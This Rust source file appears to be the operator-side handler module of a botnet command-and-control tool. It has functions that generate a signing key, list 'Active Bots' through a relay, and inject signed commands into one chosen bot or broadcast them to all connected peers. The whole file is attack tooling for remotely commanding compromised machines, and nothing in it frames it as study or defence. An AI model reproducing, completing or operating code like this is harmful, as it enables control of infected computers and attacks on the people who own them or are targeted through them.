use std::path::PathBuf;
use crate::crypto;
use crate::network::GhostClient;

pub async fn handle_keygen(output: PathBuf) {
    let pub_key = crypto::generate_key(&output);
    println!("Generated Key at: {}", output.display());
    println!("Public Key: {}", pub_key);
}

pub async fn handle_list(relay: String) {
    let mut client = GhostClient::connect(&relay).await;
    let peers = client.get_peers().await;
    println!("Active Bots ({})", peers.len());
    for (i, p) in peers.iter().enumerate() {
        println!("{}. {}", i+1, p);
    }
}

pub async fn handle_target(relay: String, key_path: PathBuf, target: String, cmd: String) {
    let key = crypto::load_key(&key_path);
    let packet = crypto::sign_packet(&key, cmd);
    
    let mut client = GhostClient::connect(&relay).await;
    println!("Injecting command to: {}", target);
    client.inject(target, packet).await;
    println!("Sent.");
}

pub async fn handle_broadcast(relay: String, key_path: PathBuf, cmd: String) {
    let key = crypto::load_key(&key_path);
    let packet = crypto::sign_packet(&key, cmd);
    
    let mut client = GhostClient::connect(&relay).await;
    let peers = client.get_peers().await;
    
    println!("Broadcasting to {} bots...", peers.len());
    for peer in peers {
        println!(" -> {}", peer);
        client.inject(peer, packet.clone()).await; // Packet is same for all (Valid Signature)
    }
    println!("Broadcast complete.");
}
